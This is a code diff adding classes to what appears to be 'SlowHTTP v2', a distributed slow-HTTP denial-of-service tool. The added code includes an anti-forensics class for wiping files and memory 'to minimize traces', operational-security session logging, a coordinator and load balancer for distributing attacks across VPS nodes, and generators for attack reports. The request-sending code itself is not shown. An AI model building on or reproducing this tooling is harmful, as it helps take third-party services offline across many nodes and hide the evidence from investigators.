+        self.monitor_thread = None
+        self.analytics = AttackAnalytics()
+        self.callbacks = []
+        
+    def add_callback(self, callback):
+        """Add callback for updates"""
+        self.callbacks.append(callback)
+        
+    def start(self):
+        """Start monitoring"""
+        self.running = True
+        self.monitor_thread = threading.Thread(target=self._monitor_loop)
+        self.monitor_thread.daemon = True
+        self.monitor_thread.start()
+        
+    def stop(self):
+        """Stop monitoring"""
+        self.running = False
+        if self.monitor_thread:
+            self.monitor_thread.join(timeout=5)
+            
+    def _monitor_loop(self):
+        """Main monitoring loop"""
+        while self.running:
+            stats = self.analytics.get_statistics()
+            
+            # Call all callbacks
+            for callback in self.callbacks:
+                try:
+                    callback(stats)
+                except Exception as e:
+                    logger.error(f"Monitor callback error: {e}")
+                    
+            time.sleep(self.update_interval)
+
+
+#############################################################################
+# SECURITY & ANTI-FORENSICS
+#############################################################################
+
+class AntiForensics:
+    """
+    Anti-forensics features to minimize traces
+    """
+    def __init__(self):
+        self.temp_files = []
+        self.memory_data = []
+        
+    def secure_delete_file(self, filepath):
+        """Securely delete file with multiple overwrites"""
+        if not os.path.exists(filepath):
+            return
+            
+        try:
+            # Get file size
+            file_size = os.path.getsize(filepath)
+            
+            # Overwrite with random data 3 times
+            with open(filepath, 'wb') as f:
+                for _ in range(3):
+                    f.seek(0)
+                    f.write(os.urandom(file_size))
+                    f.flush()
+                    os.fsync(f.fileno())
+            
+            # Overwrite with zeros
+            with open(filepath, 'wb') as f:
+                f.write(b'\\x00' * file_size)
+                f.flush()
+                os.fsync(f.fileno())
+            
+            # Finally delete
+            os.remove(filepath)
+            logger.info(f"Securely deleted: {filepath}")
+            
+        except Exception as e:
+            logger.error(f"Secure delete failed: {e}")
+            
+    def clear_memory(self):
+        """Clear sensitive data from memory"""
+        for data in self.memory_data:
+            try:
+                # Overwrite with zeros
+                if isinstance(data, bytearray):
+                    for i in range(len(data)):
+                        data[i] = 0
+                elif isinstance(data, list):
+                    data.clear()
+                elif isinstance(data, dict):
+                    data.clear()
+            except:
+                pass
+        
+        self.memory_data.clear()
+        
+    def cleanup_traces(self):
+        """Cleanup all traces"""
+        # Delete temp files
+        for temp_file in self.temp_files:
+            self.secure_delete_file(temp_file)
+        
+        # Clear memory
+        self.clear_memory()
+        
+        # Clear Python cache
+        import gc
+        gc.collect()
+        
+        logger.info("Forensic cleanup completed")
+
+
+class OperationalSecurity:
+    """
+    Operational security features
+    """
+    def __init__(self):
+        self.session_id = self._generate_session_id()
+        self.start_time = time.time()
+        self.actions_log = []
+        
+    def _generate_session_id(self):
+        """Generate unique session ID"""
+        return hashlib.sha256(f"{time.time()}{random.random()}".encode()).hexdigest()[:16]
+        
+    def log_action(self, action, details=None):
+        """Log operational action"""
+        entry = {
+            'timestamp': time.time(),
+            'action': action,
+            'details': details,
+            'session_id': self.session_id
+        }
+        self.actions_log.append(entry)
+        
+    def get_session_duration(self):
+        """Get session duration"""
+        return time.time() - self.start_time
+        
+    def export_opsec_log(self, filepath):
+        """Export operational security log"""
+        try:
+            with open(filepath, 'w') as f:
+                json.dump({
+                    'session_id': self.session_id,
+                    'start_time': self.start_time,
+                    'duration': self.get_session_duration(),
+                    'actions': self.actions_log
+                }, f, indent=2)
+            logger.info(f"OpSec log exported: {filepath}")
+        except Exception as e:
+            logger.error(f"Failed to export OpSec log: {e}")
+
+
+
+#############################################################################
+# DISTRIBUTED COORDINATION & LOAD BALANCING
+#############################################################################
+
+class LoadBalancer:
+    """
+    Intelligent load balancing across VPS nodes
+    """
+    def __init__(self):
+        self.nodes = {}
+        self.strategies = {
+            'round_robin': self._round_robin,
+            'least_connections': self._least_connections,
+            'weighted': self._weighted,
+            'random': self._random,
+        }
+        self.current_index = 0
+        self.lock = threading.Lock()
+        
+    def add_node(self, node_id, capacity=100, weight=1):
+        """Add node to load balancer"""
+        with self.lock:
+            self.nodes[node_id] = {
+                'capacity': capacity,
+                'weight': weight,
+                'current_load': 0,
+                'total_requests': 0,
+                'failed_requests': 0,
+                'avg_response_time': 0,
+                'status': 'active'
+            }
+            
+    def remove_node(self, node_id):
+        """Remove node from load balancer"""
+        with self.lock:
+            if node_id in self.nodes:
+                del self.nodes[node_id]
+                
+    def get_next_node(self, strategy='round_robin'):
+        """Get next node based on strategy"""
+        if strategy in self.strategies:
+            return self.strategies[strategy]()
+        return self._round_robin()
+        
+    def _round_robin(self):
+        """Round robin selection"""
+        with self.lock:
+            if not self.nodes:
+                return None
+                
+            active_nodes = [nid for nid, node in self.nodes.items() if node['status'] == 'active']
+            if not active_nodes:
+                return None
+                
+            node_id = active_nodes[self.current_index % len(active_nodes)]
+            self.current_index += 1
+            return node_id
+            
+    def _least_connections(self):
+        """Least connections selection"""
+        with self.lock:
+            if not self.nodes:
+                return None
+                
+            active_nodes = {nid: node for nid, node in self.nodes.items() if node['status'] == 'active'}
+            if not active_nodes:
+                return None
+                
+            return min(active_nodes.items(), key=lambda x: x[1]['current_load'])[0]
+            
+    def _weighted(self):
+        """Weighted selection"""
+        with self.lock:
+            if not self.nodes:
+                return None
+                
+            active_nodes = {nid: node for nid, node in self.nodes.items() if node['status'] == 'active'}
+            if not active_nodes:
+                return None
+                
+            # Calculate weighted probabilities
+            total_weight = sum(node['weight'] for node in active_nodes.values())
+            rand_val = random.uniform(0, total_weight)
+            
+            cumulative = 0
+            for node_id, node in active_nodes.items():
+                cumulative += node['weight']
+                if rand_val <= cumulative:
+                    return node_id
+                    
+            return list(active_nodes.keys())[0]
+            
+    def _random(self):
+        """Random selection"""
+        with self.lock:
+            if not self.nodes:
+                return None
+                
+            active_nodes = [nid for nid, node in self.nodes.items() if node['status'] == 'active']
+            if not active_nodes:
+                return None
+                
+            return random.choice(active_nodes)
+            
+    def update_node_stats(self, node_id, load_delta=0, response_time=None, success=True):
+        """Update node statistics"""
+        with self.lock:
+            if node_id in self.nodes:
+                node = self.nodes[node_id]
+                node['current_load'] += load_delta
+                node['total_requests'] += 1
+                
+                if not success:
+                    node['failed_requests'] += 1
+                    
+                if response_time:
+                    # Update moving average
+                    alpha = 0.3
+                    node['avg_response_time'] = alpha * response_time + (1 - alpha) * node['avg_response_time']
+                    
+    def get_node_stats(self, node_id):
+        """Get node statistics"""
+        with self.lock:
+            return self.nodes.get(node_id, {}).copy()
+            
+    def get_all_stats(self):
+        """Get all nodes statistics"""
+        with self.lock:
+            return {nid: node.copy() for nid, node in self.nodes.items()}
+
+
+class DistributedCoordinator:
+    """
+    Coordinate attacks across multiple VPS nodes
+    """
+    def __init__(self):
+        self.nodes = {}
+        self.load_balancer = LoadBalancer()
+        self.sync_lock = threading.Lock()
+        self.command_queue = queue.Queue()
+        self.result_queue = queue.Queue()
+        
+    def register_node(self, node_id, connection_info):
+        """Register a VPS node"""
+        with self.sync_lock:
+            self.nodes[node_id] = {
+                'connection': connection_info,
+                'status': 'idle',
+                'current_task': None,
+                'last_heartbeat': time.time()
+            }
+            self.load_balancer.add_node(node_id)
+            
+    def unregister_node(self, node_id):
+        """Unregister a VPS node"""
+        with self.sync_lock:
+            if node_id in self.nodes:
+                del self.nodes[node_id]
+                self.load_balancer.remove_node(node_id)
+                
+    def distribute_attack(self, attack_config, node_ids=None):
+        """Distribute attack across nodes"""
+        if node_ids is None:
+            node_ids = list(self.nodes.keys())
+            
+        tasks = []
+        for node_id in node_ids:
+            task = {
+                'node_id': node_id,
+                'config': attack_config,
+                'timestamp': time.time()
+            }
+            tasks.append(task)
+            self.command_queue.put(task)
+            
+        return tasks
+        
+    def collect_results(self, timeout=60):
+        """Collect results from nodes"""
+        results = []
+        deadline = time.time() + timeout
+        
+        while time.time() < deadline:
+            try:
+                result = self.result_queue.get(timeout=1)
+                results.append(result)
+            except queue.Empty:
+                continue
+                
+        return results
+        
+    def synchronize_nodes(self):
+        """Synchronize all nodes"""
+        sync_command = {
+            'type': 'sync',
+            'timestamp': time.time()
+        }
+        
+        for node_id in self.nodes.keys():
+            self.command_queue.put({
+                'node_id': node_id,
+                'command': sync_command
+            })
+            
+    def health_check(self):
+        """Check health of all nodes"""
+        current_time = time.time()
+        unhealthy_nodes = []
+        
+        with self.sync_lock:
+            for node_id, node_info in self.nodes.items():
+                if current_time - node_info['last_heartbeat'] > 60:
+                    unhealthy_nodes.append(node_id)
+                    
+        return unhealthy_nodes
+
+
+#############################################################################
+# ADVANCED REPORTING & VISUALIZATION
+#############################################################################
+
+class ReportGenerator:
+    """
+    Generate comprehensive attack reports
+    """
+    def __init__(self):
+        self.report_data = {}
+        
+    def generate_html_report(self, attack_data, output_file):
+        """Generate HTML report"""
+        html_template = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SlowHTTP Attack Report</title>
+    <style>
+        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
+        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
+        h1 {{ color: #333; border-bottom: 3px solid #007bff; padding-bottom: 10px; }}
+        h2 {{ color: #555; margin-top: 30px; }}
+        .metric {{ display: inline-block; margin: 10px; padding: 15px; background: #f8f9fa; border-left: 4px solid #007bff; }}
+        .metric-label {{ font-size: 12px; color: #666; }}
+        .metric-value {{ font-size: 24px; font-weight: bold; color: #333; }}
+        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
+        th {{ background: #007bff; color: white; padding: 12px; text-align: left; }}
+        td {{ padding: 10px; border-bottom: 1px solid #ddd; }}
+        tr:hover {{ background: #f8f9fa; }}
+        .success {{ color: #28a745; }}
+        .warning {{ color: #ffc107; }}
+        .danger {{ color: #dc3545; }}
+        .chart {{ margin: 20px 0; padding: 20px; background: #f8f9fa; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>SlowHTTP v2 - Attack Report</h1>
+        <p><strong>Generated:</strong> {timestamp}</p>
+        <p><strong>Target:</strong> {target}</p>
+        <p><strong>Attack Type:</strong> {attack_type}</p>
+        
+        <h2>Summary Metrics</h2>
+        <div class="metric">
+            <div class="metric-label">Total Requests</div>
+            <div class="metric-value">{total_requests}</div>
+        </div>
+        <div class="metric">
+            <div class="metric-label">Success Rate</div>
+            <div class="metric-value class="success">{success_rate}%</div>
+        </div>
+        <div class="metric">
+            <div class="metric-label">Duration</div>
+            <div class="metric-value">{duration}s</div>
+        </div>
+        <div class="metric">
+            <div class="metric-label">Avg Response Time</div>
+            <div class="metric-value">{avg_response_time}ms</div>
+        </div>
+        
+        <h2>Node Performance</h2>
+        <table>
+            <tr>
+                <th>Node ID</th>
+                <th>Requests</th>
+                <th>Success Rate</th>
+                <th>Avg Response Time</th>
+                <th>Status</th>
+            </tr>
+            {node_rows}
+        </table>
+        
+        <h2>Status Code Distribution</h2>
+        <table>
+            <tr>
+                <th>Status Code</th>
+                <th>Count</th>
+                <th>Percentage</th>
+            </tr>
+            {status_code_rows}
+        </table>
+        
+        <h2>Timeline</h2>
+        <div class="chart">
+            <p>Attack timeline visualization would go here</p>
+        </div>
+        
+        <h2>Recommendations</h2>
+        <ul>
+            {recommendations}
+        </ul>
+    </div>
+</body>
+</html>
+        """
+        
+        # Format data
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
+        # Generate node rows
+        node_rows = ""
+        for node_id, stats in attack_data.get('nodes', {}).items():
+            node_rows += f"""
+            <tr>
+                <td>{node_id}</td>
+                <td>{stats.get('requests', 0)}</td>
+                <td class="success">{stats.get('success_rate', 0):.1f}%</td>
+                <td>{stats.get('avg_response_time', 0):.2f}ms</td>
+                <td>{stats.get('status', 'unknown')}</td>
+            </tr>
+            """
+        
+        # Generate status code rows
+        status_code_rows = ""
+        total_requests = attack_data.get('total_requests', 1)
+        for code, count in attack_data.get('status_codes', {}).items():
+            percentage = (count / total_requests) * 100
+            status_code_rows += f"""
+            <tr>
+                <td>{code}</td>
+                <td>{count}</td>
+                <td>{percentage:.1f}%</td>
+            </tr>
+            """
+        
+        # Generate recommendations
+        recommendations = ""
+        for rec in attack_data.get('recommendations', []):
+            recommendations += f"<li>{rec}</li>"
+        
+        # Fill template
+        html_content = html_template.format(
+            timestamp=timestamp,
+            target=attack_data.get('target', 'N/A'),
+            attack_type=attack_data.get('attack_type', 'N/A'),
+            total_requests=attack_data.get('total_requests', 0),
+            success_rate=attack_data.get('success_rate', 0),
+            duration=attack_data.get('duration', 0),
+            avg_response_time=attack_data.get('avg_response_time', 0),
+            node_rows=node_rows,
+            status_code_rows=status_code_rows,
+            recommendations=recommendations
+        )
+        
+        # Write to file
+        with open(output_file, 'w') as f:
+            f.write(html_content)
+            
+        logger.info(f"HTML report generated: {output_file}")
+        
+    def generate_json_report(self, attack_data, output_file):
+        """Generate JSON report"""
+        report = {
+            'metadata': {
+                'generated_at': datetime.now().isoformat(),
+                'version': VERSION,
+                'report_type': 'attack_summary'
+            },
+            'attack_info': attack_data
+        }
+        
+        with open(output_file, 'w') as f:
+            json.dump(report, f, indent=2)
+            
+        logger.info(f"JSON report generated: {output_file}")
+        
+    def generate_csv_report(self, attack_data, output_file):
+        """Generate CSV report"""
+        import csv
+        
+        with open(output_file, 'w', newline='') as f:
+            writer = csv.writer(f)
+            
+            # Write headers
+            writer.writerow(['Metric', 'Value'])
+            
+            # Write data
+            for key, value in attack_data.items():
+                if not isinstance(value, (dict, list)):
+                    writer.writerow([key, value])
+                    
+        logger.info(f"CSV report generated: {output_file}")
+
+
+class PerformanceProfiler:
+    """
+    Profile attack performance
+    """
+    def __init__(self):
+        self.profiles = {}
+        self.current_profile = None
+        
+    def start_profile(self, profile_name):
+        """Start profiling"""
+        self.current_profile = profile_name
+        self.profiles[profile_name] = {
+            'start_time': time.time(),
+            'end_time': None,
+            'metrics': {},
+            'events': []
+        }
+        
+    def stop_profile(self):
+        """Stop profiling"""
+        if self.current_profile and self.current_profile in self.profiles:
+            self.profiles[self.current_profile]['end_time'] = time.time()
+            
+    def record_metric(self, metric_name, value):
+        """Record a metric"""
+        if self.current_profile and self.current_profile in self.profiles:
+            self.profiles[self.current_profile]['metrics'][metric_name] = value
+            
+    def record_event(self, event_name, details=None):
+        """Record an event"""
+        if self.current_profile and self.current_profile in self.profiles:
+            event = {
+                'timestamp': time.time(),
+                'name': event_name,
+                'details': details
+            }
+            self.profiles[self.current_profile]['events'].append(event)
+            
+    def get_profile(self, profile_name):
+        """Get profile data"""
+        return self.profiles.get(profile_name, {})
+        
+    def analyze_profile(self, profile_name):
+        """Analyze profile data"""
+        profile = self.profiles.get(profile_name)
+        if not profile:
+            return None
+            
+        analysis = {
+            'duration': profile['end_time'] - profile['start_time'] if profile['end_time'] else None,
+            'event_count': len(profile['events']),
+            'metrics': profile['metrics'].copy()
+        }
+        
+        return analysis
+
+
+#############################################################################
+# CONFIGURATION MANAGEMENT
+#############################################################################
+
+class ConfigurationManager:
+    """
+    Manage application configuration
+    """
+    def __init__(self, config_file='config.json'):
+        self.config_file = config_file
+        self.config = self.load_config()
+        
+    def load_config(self):
+        """Load configuration from file"""
+        if os.path.exists(self.config_file):
+            try:
+                with open(self.config_file, 'r') as f:
+                    return json.load(f)
+            except Exception as e:
+                logger.error(f"Failed to load config: {e}")
+                return self.get_default_config()
+        return self.get_default_config()
+        
+    def save_config(self):
+        """Save configuration to file"""
+        try:
+            with open(self.config_file, 'w') as f:
+                json.dump(self.config, f, indent=2)
+            logger.info(f"Configuration saved: {self.config_file}")
+        except Exception as e:
+            logger.error(f"Failed to save config: {e}")
+            
+    def get_default_config(self):
+        """Get default configuration"""
+        return {
+            'version': VERSION,
+            'attack': {
+                'default_connections': 200,
+                'default_duration': 300,
+                'default_delay': 15,
+                'max_connections': 1000,
+                'timeout': 30
+            },
+            'network': {
+                'connect_timeout': 10,
+                'read_timeout': 30,
+                'max_retries': 3,
+                'retry_delay': 5
+            },
+            'security': {
+                'encryption_enabled': True,
+                'secure_delete': True,
+                'anti_forensics': True
+            },
+            'logging': {
+                'level': 'INFO',
+                'max_file_size': 10485760,
+                'backup_count': 5
+            },
+            'performance': {
+                'thread_pool_size': 50,
+                'connection_pool_size': 100,
+                'rate_limit': 1000
+            }
+        }
+        
+    def get(self, key, default=None):
+        """Get configuration value"""
+        keys = key.split('.')
+        value = self.config
+        
+        for k in keys:
+            if isinstance(value, dict) and k in value:
+                value = value[k]
+            else:
+                return default
+                
+        return value
+        
+    def set(self, key, value):
+        """Set configuration value"""
+        keys = key.split('.')
+        config = self.config
+        
+        for k in keys[:-1]:
+            if k not in config:
+                config[k] = {}
+            config = config[k]
+            
+        config[keys[-1]] = value
+        self.save_config()
+        
+    def validate_config(self):
+        """Validate configuration"""
+        required_keys = [
+            'version',
+            'attack.default_connections',
+            'network.connect_timeout',
+            'security.encryption_enabled'
+        ]
+        
+        for key in required_keys:
+            if self.get(key) is None:
+                logger.warning(f"Missing required config key: {key}")
+                return False
+                
+        return True
+
 
 def main():
     """Main function to run the application"""
